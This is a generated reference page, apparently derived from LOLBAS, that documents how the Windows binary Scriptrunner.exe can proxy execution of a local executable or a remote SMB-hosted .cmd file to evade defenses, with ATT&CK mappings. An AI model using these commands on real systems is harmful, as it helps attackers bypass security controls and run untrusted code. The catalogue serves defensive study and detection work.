---
parsed_by: focuslocust
source: commands
type: generated
---
# Scriptrunner Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Scriptrunner.exe

Tool page: [Scriptrunner.exe](../../tools/windows/scriptrunner.exe.md)

### Execute binary through proxy binary to evade defensive counter measures

```text
Scriptrunner.exe -appvscript {PATH:.exe}
```

Description:

Executes executable

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Scriptrunner.yml` |
| Evidence | Command preserved from source parser. |

### Execute binary through proxy binary from external server to evade defensive counter measures

```text
ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
```

Description:

Executes cmd file from remote server

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Scriptrunner.yml` |
| Evidence | Command preserved from source parser. |
